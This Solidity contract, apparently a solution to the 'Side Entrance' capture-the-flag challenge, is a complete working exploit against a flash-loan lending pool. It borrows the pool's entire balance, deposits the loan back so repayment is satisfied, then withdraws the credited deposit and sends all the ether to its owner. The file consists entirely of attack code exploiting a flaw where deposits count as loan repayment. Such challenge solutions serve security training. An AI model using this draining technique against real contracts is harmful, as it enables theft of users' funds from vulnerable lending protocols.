// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    address private immutable owner;
    SideEntranceLenderPool private immutable pool;
    constructor(address poolAddress) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(poolAddress);
    }

    receive() external payable {
        (bool success, ) = owner.call{value: msg.value}("");
        require(success, "Unable to transfer value to owner");
    }

    function attack() external {
        require(msg.sender == owner, "Must be owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
    }

    function execute() override external payable {
        require(msg.sender == address(pool), "Must be Lender Pool");
        pool.deposit{value: msg.value}();
    }
}